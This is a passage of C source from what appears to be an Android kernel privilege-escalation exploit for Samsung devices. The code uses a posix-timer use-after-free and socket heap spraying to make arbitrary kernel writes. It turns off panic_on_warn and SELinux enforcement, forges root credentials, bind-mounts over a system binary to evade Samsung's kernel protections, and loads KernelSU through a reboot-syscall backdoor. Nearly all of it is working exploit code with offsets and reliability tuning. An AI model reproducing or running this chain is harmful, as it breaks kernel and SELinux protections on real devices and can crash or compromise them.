         * arbitrary kernel memory.  Distinguish by SELinux context: a
         * forged-cred process reads "kernel" from /proc/self/attr/current,
         * while a daemon respawned by init or started by the manager
         * through the driver's root_execve carries a real kernel-issued
         * root cred and reads init/ksu.  Kill only the forged ones (safe:
         * their cred page is still alive at this point), and allow the
         * drain to proceed only when none remain.
         */
        "echo '[ksu] cleanup: forged-cred sweep'\n"
        "for p in $(pidof ksud 2>/dev/null); do\n"
        "  C=$(cat /proc/$p/attr/current 2>/dev/null)\n"
        "  echo \"[ksu] ksud pid=$p ctx=$C\"\n"
        "  case \"$C\" in kernel)\n"
        "    kill -9 $p 2>/dev/null ;;\n"
        "  esac\n"
        "done\n"
        "sleep 1\n"
        "BAD=0\n"
        "for p in $(pidof ksud 2>/dev/null); do\n"
        "  C=$(cat /proc/$p/attr/current 2>/dev/null)\n"
        "  echo \"[ksu] survivor pid=$p ctx=$C\"\n"
        "  case \"$C\" in kernel) BAD=1 ;; esac\n"
        "done\n"
        "if [ $BAD = 0 ]; then echo '[ksu] no forged-cred holders'; "
        "else echo '[ksu] WARN: forged-cred holder remains'; fi\n"
        /* panic_on_warn was zeroed through the raw-write primitive (and
         * warn_limit with it); restore it the clean way. */
        "echo 1 > /proc/sys/kernel/panic_on_warn 2>/dev/null\n"
        "echo \"[ksu] panic_on_warn=$(cat /proc/sys/kernel/panic_on_warn "
        "2>/dev/null)\"\n"
        /* Evidence that must survive a panic: the module's klog (KDP/RKP
         * detection, hook installation) is only in dmesg. */
        "dmesg | tail -n 4000 > /data/local/tmp/samtimer/dmesg_after_load.log "
        "2>&1\n"
        /* Early-warning counter: any kernel oops/WARN during the chain is
         * a reason to distrust the run and reboot before reusing it. */
        "echo \"[ksu] dmesg hazards=$(dmesg | grep -aciE "
        "'Oops|BUG:|Unable to handle')\"\n"
        "echo \"[ksu] enf=$(getenforce)\"\n"
        "if [ $BAD = 0 ]; then "
        "echo done > /data/local/tmp/samtimer/cleanup.ok; "
        "else echo refused > /data/local/tmp/samtimer/cleanup.ok; fi\n";
    int fd = open("/data/local/tmp/ksu_stage.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
        return;
    (void)!write(fd, script, sizeof(script) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
}

/*
 * Authoritative KSU check, copied from RootMyGalaxy-Payloads
 * su_daemon.c:verify_kernelsu_control: the KSU driver hands its control
 * fd out through the reboot() backdoor, then KSU_GET_INFO reports the
 * live module state (fusion-s24u verified output on this device family:
 * "KernelSU control verified version=32601 flags=0x5 uapi=2").  On a
 * stock kernel the magic reboot is just an EINVAL no-op.
 */
static int verify_ksu_control(void)
{
    struct ksu_get_info_cmd
    {
        uint32_t version;
        uint32_t flags;
        uint32_t features;
        uint32_t uapi_version;
    };
    struct ksu_get_info_cmd info;
    /* The backdoor writes the fd as a 32-bit int at the given pointer
     * (verified on-device: a 64-bit holder keeps its upper -1 bytes and
     * reads as negative).  RootMyGalaxy uses int fd as well. */
    int fd = -1;
    int ret;
    int i;

    /*
     * ksud's late-load registers the module asynchronously: /proc/modules
     * lists `kernelsu` as soon as load_module() returns, but the driver's
     * reboot kprobe (ksu_supercalls_init) is registered from the same
     * init_module path and can lag the /proc/modules visibility by a few ms
     * on a busy boot.  The first try right after KSU_LOADED therefore
     * sometimes reads a still-(-1) fd; retry briefly instead of failing.
     * The magic (0xDEADBEEF/0xCAFEBABE) is KernelSU's KSU_INSTALL_MAGIC1/2
     * (uapi/supercall.h) -- unchanged from the KernelSU-Next build this was
     * ported from.
     */
    for (i = 0; i < 8; i++)
    {
        long rr;

        fd = -1;
        errno = 0;
        rr = syscall(SYS_reboot, 0xDEADBEEFUL, 0xCAFEBABEUL, 0, &fd);
        if (fd >= 0)
            break;
        if (i == 0)
            logf("[ksu] control fd retry: reboot_ret=%ld errno=%d fd=%d\n",
                 rr, errno, fd);
        usleep(20000);
    }
    if (fd < 0)
    {
        logf("[-] KSU control verify: driver fd unavailable\n");
        return 1;
    }
    memset(&info, 0, sizeof(info));
    ret = ioctl(fd, _IOR('K', 2, struct ksu_get_info_cmd), &info);
    close(fd);
    if (ret != 0 || info.version == 0 || (info.flags & 1U) == 0)
    {
        logf("[-] KSU control verify failed ret=%d errno=%d version=%u "
             "flags=0x%x uapi=%u features=0x%x\n",
             ret, errno, info.version, info.flags, info.uapi_version,
             info.features);
        return 1;
    }
    logf("[+] KSU control verified version=%u flags=0x%x uapi=%u "
         "features=0x%x\n",
         info.version, info.flags, info.uapi_version, info.features);
    return 0;
}


/*
 * UMH action script, run as "/system/bin/sh umh_action.sh" by the injected
 * work.  The usermodehelper exec must target a system-signed binary (a
 * direct exec of a /data/local/tmp binary can be killed by KDP/DEFEX
 * before its first instruction), and the script then performs the
 * /system/bin/logcat bind-mount KDP trick and hands over to the stage
 * script -- the BuSung-dev umh_action.sh pattern.
 */
static void write_umh_script(void)
{
    /* The app creates the work dir before running us, but a run started by
     * hand from `adb shell` would otherwise fail here and only surface as a
     * missing readiness file after the work item was already queued. */
    (void)mkdir("/data/local/tmp/samtimer", 0777);
    static const char script[] =
        "#!/system/bin/sh\n"
        "exec >/data/local/tmp/samtimer/umh-kdp.log 2>&1\n"
        "echo \"[umh] start uid=$(id -u) "
        "ctx=$(cat /proc/self/attr/current 2>/dev/null) "
        "enf=$(getenforce 2>/dev/null)\"\n"
        /* readiness marker first: the exploit parent polls for it */
        ": > /data/local/tmp/samtimer/umh-action.log\n"
        /* KSU's sepolicy only lets init reach the ksud domain */
        "echo -n u:r:init:s0 > /proc/self/attr/current 2>/dev/null\n"
        "unshare -m sh -c '\n"
        "  mount --bind /data/local/tmp/samtimer/ksud /system/bin/logcat "
        "|| { echo mount_failed; exit 11; }\n"
        "  echo \"[umh] bind mounted kdp\"\n"
        "  /system/bin/logcat --version\n"
        "  exec sh /data/local/tmp/ksu_stage.sh\n"
        "'\n"
        "echo \"[umh] outer rc=$?\"\n";
    int fd = open("/data/local/tmp/samtimer/umh_action.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
        return;
    (void)!write(fd, script, sizeof(script) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/samtimer/umh_action.sh", 0755);
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw,
                      unsigned long long static_target);

/*
 * Failed-plant zombie: the trigger's timer node is freed while still linked
 * ("stale"), so a reap would run timerqueue_del on reused memory.  Instead of
 * holding the zombie forever, make the reap safe first: posix_cpu_timers_exit
 * walks each queue via its rb_leftmost pointer and skips a queue whose
 * leftmost is NULL (verified in our vmlinux: LDR X20,[X19,#0x7A0]; CBZ).
 * Zero the three leftmost slots in the zombie's task_struct with zero plants,
 * then reap normally -- no zombie remains, so a dying holder can never hand
 * stale nodes to init's reaper.
 *
 * Three zero plants, each retried; if any cannot land the zombie is held
 * (g_held) exactly like before, so the old behaviour is the fallback.
 */
static int g_repairing;

/* loginuid read-back for the repair probe (world-readable, unlike
 * panic_on_warn which is root-only on Samsung builds). */
static long read_loginuid(pid_t p)
{
    char path[64], buf[32];
    int fd, n;

    snprintf(path, sizeof(path), "/proc/%d/loginuid", (int)p);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    n = (int)read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return -1;
    buf[n] = 0;
    return strtol(buf, NULL, 10);
}

static void repair_zombie(pid_t z, unsigned long long ztask,
                          unsigned char *raw, int tag)
{
    static const unsigned long long slots[3] = {
        /* queue leftmosts only: the posix_cpu_timers_exit walk reads the
         * leftmost first and skips the whole queue when it is NULL, so the
         * queue roots are never dereferenced -- zeroing them would just be
         * three extra (and failure-prone) plants per zombie. */
        OFF_TQ_LEFTMOST_0, OFF_TQ_LEFTMOST_1, OFF_TQ_LEFTMOST_2
    };

    if (!ztask || (ztask & 0x3f) || g_repairing || !g_slide_set)
    {
        logf("[-] plant%d zombie %d cannot repair (task=%#llx slide=%d) "
             "-- held\n",
             tag, z, ztask, g_slide_set);
        hold_victim(z, ztask);
        return;
    }
    g_repairing = 1;
    {
        /*
         * Round-trip probe first: the repair writes are kernel writes we
         * cannot read back directly, and a "successful" plant is only a
         * heuristic.  The zombie's loginuid (task+OFF_TASK_LOGINUID) is
         * written through the same pipeline and read back through
         * /proc/<pid>/loginuid, which is world-readable (panic_on_warn is
         * root-only on Samsung builds and cannot serve as the probe).
         * Mode 4's value is fully predictable ((V & ~0x1fff) + 0x1000),
         * so the read-back is a byte-exact check of the pipeline; mode 0
         * then proves the zero write.  Without a verified probe the
         * zombie is never reaped: a reap with stale nodes is a guaranteed
         * kernel panic.
         */
        struct plant_res r;
        int a, ok = 0;
        long got;
        unsigned int want = 0;

        /*
         * The probes exist to verify the write pipeline through
         * /proc/<pid>/loginuid before the dangerous head zeroing.  As shell
         * that file reads back as -1/0xffffffff (observed: "probe (zero)
         * unverified got=4294967295" on every repair), so the two probe loops
         * below are pure cost -- six plants per repaired victim, and with the
         * bigger stage budget that alone is enough to walk into the 100 s
         * softdog.  Skip them when the read-back cannot work and go straight
         * to the three leftmost zero plants, which are what the repair needs.
         */
        if (read_loginuid(z) < 0 || read_loginuid(z) == 0xffffffffL)
            goto head_zeroing;

        for (a = 0; a < 3 && !ok; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + OFF_TASK_LOGINUID, 88, 4, &r, raw, 0);
            if (r.ok)
                ok = 1;
            else if (!r.retry)
                break;
        }
        if (ok)
            want = (unsigned int)((((r.A - 0x78) & ~0x1fffULL) + 0x1000) &
                                  0xffffffffULL);
        got = ok ? read_loginuid(z) : -1;
        if (!ok || got != (long)want)
        {
            /*
             * The probe is one plant with the same failure modes as the
             * head zeroing below; its miss does not prove the queue heads
             * cannot be zeroed.  Try the real repair (three leftmosts)
             * and only hold if one of those plants fails.
             */
            logf("[!] plant%d zombie %d probe (nonzero) unverified "
                 "want=%#x got=%ld; trying head zeroing\n",
                 tag, z, want, got);
        }
        ok = 0;
        for (a = 0; a < 3 && !ok; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + OFF_TASK_LOGINUID, 89, 0, &r, raw, 0);
            if (r.ok)
                ok = 1;
            else if (!r.retry)
                break;
        }
        got = ok ? read_loginuid(z) : -1;
        if (!ok || got != 0)
            logf("[!] plant%d zombie %d probe (zero) unverified "
                 "got=%ld; trying head zeroing\n", tag, z, got);
    }
head_zeroing:
    for (int i = 0; i < 3; i++)
    {
        struct plant_res r;
        int a, ok = 0;

        for (a = 0; a < 3; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + slots[i], 90 + i, 0, &r, raw, 0);
            if (r.ok)
            {
                ok = 1;
                break;
            }
            if (!r.retry)
                break;
        }
        if (!ok)
        {
            g_repairing = 0;
            logf("[-] plant%d zombie %d repair[%d] failed -- held\n",
                 tag, z, i);
            hold_victim(z, ztask);
            return;
        }
    }
    g_repairing = 0;
    kill(z, SIGKILL);
    {
        int st = 0;

        if (waitpid(z, &st, 0) == z)
            logf("[+] plant%d zombie %d repaired+reaped (st=%#x)\n",
                 tag, z, st);
        else
            logf("[!] plant%d zombie %d reap failed\n", tag, z);
    }
}

/* Record a held victim: (pid, task_struct VA).  The task_struct stays
 * allocated while the zombie is unreaped, so its posix_cputimers queue
 * heads can still be safely zeroed before parking.
 *
 * The table is also what park_forever()/safe_unlink_held() can still
 * detach.  A held victim that is not recorded here stays dangerous
 * forever: its stale timerqueue node is only walked when the zombie is
 * reaped, and nothing would zero that queue, so planting has to stop
 * before the table overflows (held_table_full()). */
static int held_table_full(void)
{
    return g_held_n >= MAX_HELD;
}

static void hold_victim(pid_t pid, unsigned long long task)
{
    g_held++;
    if (!held_table_full())
    {
        g_held_pid[g_held_n] = (int)pid;
        g_held_task[g_held_n] = task;
        g_held_n++;
        return;
    }
    logf("[!] held table full (%d): zombie %d (task=%#llx) can no longer "
         "be detached -- reboot required\n", MAX_HELD, (int)pid, task);
}

/* Safe teardown (adapted from RiosWesley/SamTimer PR #2).  The stale
 * timerqueue node lives in a page the allocator already reclaimed, so the
 * node itself must not be touched.  The victim's task_struct is still
 * alive until the zombie is really reaped; zeroing its three CPU-clock
 * timerqueue heads (16 bytes each: rb_root + rb_leftmost) makes
 * posix_cpu_timers_exit() skip the queues when init later reaps the
 * zombie.
 *
 * 5.15 layout (BTF + posix_cpu_timers_exit disasm):
 *   task_struct.posix_cputimers          @ 0x738
 *   bases[3], stride 0x18, tqhead @ +0x8
 *   => heads at task + 0x740 / 0x758 / 0x770
 * Uses the stable pipe physrw; if it is not ready (early failed plant) or
 * the reads look wrong, skip without writing. */
static void safe_unlink_held(void)
{
    if (g_safe_done || g_held_n == 0)
        return;
    if (g_safe_rfd < 0 || g_safe_wfd < 0 || !g_safe_page)
    {
        logf("[!] safe-unlink: physrw not ready; %d held victim(s) "
             "still dangerous on reboot\n", g_held_n);
        return;
    }
    int ok_all = 1;
    for (int i = 0; i < g_held_n; i++)
    {
        unsigned long long task = g_held_task[i];

        if (task < 0xffffff8000000000ULL ||
            task >= 0xffffffc000000000ULL || (task & 0x3f))
        {
            logf("[!] safe-unlink: bad task %#llx pid=%d\n",
                 task, g_held_pid[i]);
            continue;
        }
        for (int b = 0; b < 3; b++)
        {
            unsigned long long tq = task + 0x740ULL + (unsigned long long)b * 0x18ULL;
            unsigned long long cur[2] = {0, 0};
            unsigned long long z[2] = {0, 0};

            if (user_pipe_read(g_safe_rfd, g_safe_page, tq, cur, 16) != 16)
            {
                logf("[!] safe-unlink: read tq[%d] failed task=%#llx\n",
                     b, task);
                ok_all = 0;
                continue;
            }
            if ((cur[0] && (cur[0] < 0xffffff8000000000ULL ||
                            cur[0] >= 0xffffffc000000000ULL)) ||
                (cur[1] && (cur[1] < 0xffffff8000000000ULL ||
                            cur[1] >= 0xffffffc000000000ULL)))
            {
                logf("[!] safe-unlink: bad tq[%d] root=%#llx left=%#llx "
                     "task=%#llx\n", b, cur[0], cur[1], task);
                ok_all = 0;
                continue;
            }
            if (user_pipe_write(g_safe_wfd, g_safe_page, tq, z, 16) != 16)
            {
                logf("[!] safe-unlink: write tq[%d] failed task=%#llx\n",
                     b, task);
                ok_all = 0;
            }
            else
                logf("[+] safe-unlink: task=%#llx base[%d] tq=%#llx "
                     "root=%#llx left=%#llx -> NULL\n",
                     task, b, tq, cur[0], cur[1]);
        }
    }
    if (ok_all)
        g_safe_done = 1;
}

/* One-shot non-zero-pointer write to an absolute (already slid) address. */
static int run_plant_once(unsigned long long target, unsigned char *raw,
                          struct plant_res *out)
{
    for (int attempt = 1; attempt <= 5; attempt++)
    {
        memset(out, 0, sizeof(*out));
        logf("[+] stage once target=%#llx attempt=%d\n", target, attempt);
        run_plant(target, 1, 4, out, raw, 0);
        if (out->ok)
            return 0;
        if (!out->retry)
            break;
    }
    logf("[-] once write failed target=%#llx\n", target);
    return -1;
}

/* Root-only debug aid: the pfn backing a user VA.  Reading pagemap needs
 * CAP_SYS_ADMIN, which the temporary DFRoot shell has; the shipping exploit
 * runs as shell and cannot use this.  It gives the marker page's true pfn
 * so the pipe bootstrap can be validated without the destructive
 * per-candidate marker plant. */
static unsigned long long pagemap_pfn(void *va)
{
    unsigned long long e = 0;
    int fd;
    off_t off;

    if (!va || va == MAP_FAILED)
        return 0;
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0)
        return 0;
    off = (off_t)(((uintptr_t)va >> 12) * 8);
    if (pread(fd, &e, sizeof(e), off) != (ssize_t)sizeof(e))
    {
        close(fd);
        return 0;
    }
    close(fd);
    if (!(e & (1ULL << 63)))
        return 0;
    return e & ((1ULL << 55) - 1);
}

static int selinux_is_permissive(void)
{
    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
    int v = -1;

    if (!f)
        return -1;
    if (fscanf(f, "%d", &v) != 1)
        v = -1;
    fclose(f);
    return v == 0;
}

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out, unsigned long long static_target){
    struct plant_res r;

    /*
     * Held victims are tolerated as long as the victims stay detachable: the
     * stale zombies stay parked in this process and are detached by
     * park_forever()/safe_unlink_held() once the pipe primitive exists.  A
     * *missed* plant on top of one is what stops the chain, and so does a
     * full held table.
     *
     * The previous policy returned -1 unconditionally after any plant that
     * incremented g_held, which also discarded a later attempt that had
     * actually landed the target write (attempt 1 repairs and holds,
     * attempt 2 hits -> the hit was thrown away).  Checking r.ok first is
     * what keeps such a run alive.
     */
    if (held_table_full())
    {
        logf("[!] held table full (%d entries); refusing further plants "
             "(reboot required)\n", MAX_HELD);
        return -1;
    }
    /*
     * Retries pick a fresh victim each time (run_plant re-selects), so more
     * attempts directly raise the success rate; a success costs one plant and
     * the plants that end in "exec completed" drain their spray, so eight
     * attempts are cheap.  Accepted policy: the trigger is probabilistic
     * (~1 in 3 plants aborts, and an abort almost always reclaims), so the
     * budget is what turns that into a usable per-boot success rate.
     */
    for (int attempt = 1; attempt <= 8; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw, static_target);
        /*
         * run_plant can report ok=0 even though the rb_erase store landed
         * (the zombie/reap bookkeeping is the unreliable part).  Verify the
         * two global side effects directly before spending another plant.
         */
        if (!r.ok)
        {
            if (!strcmp(what, "panic_on_warn") && read_panic_on_warn() == 0)
            {
                logf("[+] stage %s verified by readback (plant ok=0)\n",
                     what);
                r.ok = 1;
            }
            else if (!strcmp(what, "selinux") && selinux_is_permissive() == 1)
            {
                logf("[+] stage %s verified by readback (plant ok=0)\n",
                     what);
                r.ok = 1;
            }
        }
        if (r.ok)
        {
            if (g_held > 0)
                logf("[!] stage %s hit with %d held zombie(s); target "
                     "write landed, continuing\n", what, g_held);
            if (out)
                *out = r;
            return 0;
        }
        if (g_held > 0)
        {
            logf("[!] stage %s missed with %d held zombie(s); stopping "
                 "(reboot required)\n", what, g_held);
            return -1;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 10
#define SPRAY_SOCKS 4096
#define SPRAY_PRE 4000
/* Phase 2 fires after the parent already sees the victim page free; the
 * catch happens in phase 1's continuous writes (rate, not volume).  A few
 * thousand post writes are plenty of margin -- 20000 wrote another ~156 MiB
 * of skbs per plant (8 KiB each) and cost seconds across the chain.  Note
 * that a mode-6 attempt keeps its whole spray allocated until the bootstrap
 * merge is confirmed, so this constant is multiplied by the retry count. */
#define SPRAY_POST 12000
/* First non-order-1 allocation our spray made at the victim pfn (0 = none).
 * Diagnostic only: a non-zero value means a larger slab block was involved and
 * the hit check deliberately did NOT trust it (see scan_page_alloc_ours). */
static int g_carrier_alt;
static _Atomic int g_burst, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];  /* zero/repair plants; drained every time */
/* Keep pool: payload pages that must outlive their plant because something
 * else points at them -- mode 2 (task->cred -> the fake cred page) and mode 6
 * (pipe->bufs -> the reclaimed node page).  Draining it is only safe once
 * neither pointer exists any more. */
static int g_fpool[SPRAY_SOCKS][2];
static int g_fpool_n;
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int (*pool)[2];
    int pool_n;
    int sock_first, sock_count, cpu, idx;
    int pre, post;   /* phase sizes; mode-6 plants use a smaller budget */
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    /*
     * Separate pool for the mode-2 fake-cred plant: its reclaimed page holds
     * the fake cred that task->cred points at, so it must never be drained
     * once the plant succeeds.  Every later zero-mode plant drains only
     * g_pool.
     */
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_fpool[i]))
            break;
        setsockopt(g_fpool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_fpool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_fpool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it AND the allocation is an order-1 block: our 8 KiB payload then
 * sits at offset 0 of that block and covers the victim slab exactly.
 *
 * Why order 1 is required, and why a larger order must not be accepted even
 * though it looks tempting: a page_alloc record only carries the *block*
 * pfn, not which object inside a multi-object slab we were handed.  For an
 * order-2/3 kmalloc slab the block starts at the same pfn for every object,
 * so accepting it could "confirm" a reclaim while our payload actually sits
 * 8/16 KiB further in -- the erase would then read a foreign rb_node and
 * write a garbage value to the target.  The vivo GKI port hit the sibling
 * problem from the other side (their 8 KiB stream data went to kmalloc-8k,
 * order 2/3, so no order-1 frag ever appeared and their hit check stayed
 * blind); `probe` answers which carrier a device really uses, and this check
 * keeps the safe side until that is known.
 *
 * `alt_order` reports the first non-1 order seen at the victim pfn for our
 * spray, purely so the log shows whether a larger-block carrier exists.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn, int *alt_order)
{
    int hit = 0;

    if (alt_order)
        *alt_order = 0;
    for (size_t i = 8; i + 12 <= n; i += 4)
    {
        int pid, order;

        if (u64(b, i) != pfn)
            continue;
        order = (int)u32(b, i + 8);
        if (g_dump_pfn)
            logf("[pfn] type=%u alloc? pid=%d pfn=%#llx order=%d\n",
                 (unsigned)(u32(b, i - 8) & 0xffff),
                 (int)u32(b, i - 4), u64(b, i), order);
        if (order < 1 || order > 10)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
            {
                if (order == 1)
                    hit = 1;
                else if (alt_order && !*alt_order)
                    *alt_order = order;
                break;
            }
    }
    return hit;
}

/*
 * Diagnostic: dump every trace line mentioning the victim pfn so we can see
 * exactly which alloc/free touched V's page (order, pid) and whether it was
 * our spray's payload frag or something else.
 *
 * [trace] diagnostics commented out -- bring-up is done, the dump is pure
 * noise (and scans up to 200k trace lines per call).  Restore the body
 * below to re-enable.
 */
static void dump_victim_trace(unsigned long long pfn)
{
    (void)pfn;
    /*
    char line[768];
    char needle[40];
    FILE *f = fopen(TR "/trace", "r");
    int shown = 0, scanned = 0;

    if (!f)
        return;
    snprintf(needle, sizeof(needle), "pfn=%#llx", pfn);
    logf("[trace] --- events mentioning %s ---\n", needle);
    while (fgets(line, sizeof(line), f) && shown < 24 && scanned < 200000)
    {
        scanned++;
        if (strstr(line, needle))
        {
            logf("[trace] %s", line);
            shown++;
        }
    }
    fclose(f);
    logf("[trace] --- end (%d lines, scanned %d) ---\n", shown, scanned);
    */
}

/*
 * Free the pages one spray left queued.  Without this each plant attempt
 * pins ~1.5-2GB of skb data; the fake-mode stage writes (times retries)
 * then exhaust memory and the kernel panics with "System is deadlocked on
 * memory".  `fake` selects which pool to drain: the fake-cred pool may only
 * be drained on FAILED attempts (a success holds the live fake cred).
 */
static void drain_spray(int fake)
{
    static unsigned char sink[65536];
    int (*pool)[2] = fake ? g_fpool : g_pool;
    int n = fake ? g_fpool_n : g_pool_n;

    /*
     * No guard here: mode-6 payload pages live in the *keep* pool (g_fpool),
     * never in g_pool, so draining g_pool can no longer free the page that
     * pipe->bufs points at.  Callers that drain the keep pool must check
     * g_keep_bufs themselves (park_forever does; the post-merge path clears
     * it because bufs moved to the user marker page).
     */
    for (int i = 0; i < n; i++)
    {
        ssize_t rd;

        do
            rd = recv(pool[i][1], sink, sizeof(sink), MSG_DONTWAIT);
        while (rd > 0);
    }
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        usleep(200);
    if (atomic_load(&g_stop_spray))
        return NULL;
    /*
     * Phase 1 is a tight burst.  The device logs are unambiguous about the
     * timing: every successful plant reports `burst hit=1 after 0ms` with
     * `free_seen` usually still 0, i.e. the victim's slab page is already in
     * the buddy when the exec thread becomes a zombie (the k_itimer free is
     * RCU-deferred from exit_itimers(), so it lands during the thread's own
     * death).  Pacing phase 1 over 1.5 s only diluted the window that
     * matters; spend it in the first few milliseconds instead.
     */
    while (!atomic_load(&g_stop_spray) && w < a->pre)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(a->pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /*
     * Phase 2 covers the tail: released right after the zombie appears as
     * well (not only on a free record, which the RCU context often hides),
     * paced at ~8 writes/ms so the remaining 12k allocations span ~1.5 s
     * instead of being gone before a late free.
     */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < a->pre + a->post)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(a->pool[k][0], a->payload, SOCKBUF);
        w++;
        if ((w & 7) == 0)
            usleep(1000);
    }
    return NULL;
}

static int g_plant_total;
#define PLANT_BUDGET 40

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw,
                      unsigned long long static_target)
{
    unsigned long long ptrs[NTIMERS];

    /*
     * Hard cap on plants per run.  Each one costs a 512 MiB MAP_POPULATE,
     * three core dumps and a full spray; the repair path can chain fifteen of
     * them per missed victim, and with the 8-attempt stage budget that is
     * enough runtime for the 100 s softdog to fire (observed as a reset in
     * the middle of a repair).  Forty covers the productive stages with room
     * for a few repairs; past that the run parks instead of gambling the
     * device.
     */
    if (++g_plant_total > PLANT_BUDGET)
        park_forever("plant budget exhausted");
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    g_carrier_alt = 0;
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    /*
     * Trace from before the fork: copy_process()'s task_struct allocation is
     * what gives the failure path T's task address for the zombie repair.
     */
    trace_start();
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        trace_stop();
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        trace_stop();
        return;
    }
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long T_task = 0;
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    /*
     * Victim capture first: do_timer_create's kmem_cache_alloc return
     * address gives this boot's slide, which the task_struct scan below
     * needs to match dup_task_struct's call site exactly.  Scanning the
     * task first (without a slide on the first plant) matched *any*
     * 0x1200-byte kmem_cache_alloc of this pid and was then rejected as
     * ambiguous, which left the failure path without a task_struct
     * address to repair the zombie's timer queues through.
     */
    int slide_was_set = g_slide_set;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
